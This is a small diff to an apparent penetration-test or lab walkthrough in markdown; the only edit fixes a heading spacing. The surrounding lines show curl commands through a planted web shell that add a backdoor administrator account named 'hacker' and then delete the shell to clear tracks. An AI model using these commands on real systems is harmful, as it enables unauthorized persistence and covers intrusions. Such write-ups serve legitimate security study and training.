@@ -97,7 +97,7 @@ Creating Backdoor User:
 curl "http://10.150.150.11/upload/2/shell.php?cmd=net%20user%20hacker%20P@ssw0rd123%20/add"
 curl "http://10.150.150.11/upload/2/shell.php?cmd=net%20localgroup%20administrators%20hacker%20/add"
 ```
-##Phase 7: Clearing Tracks
+## Phase 7: Clearing Tracks
 Deleting Webshell:
 ``` bash
 curl "http://10.150.150.11/upload/2/shell.php?cmd=del%20C:\xampp\htdocs\upload\2\shell.php"
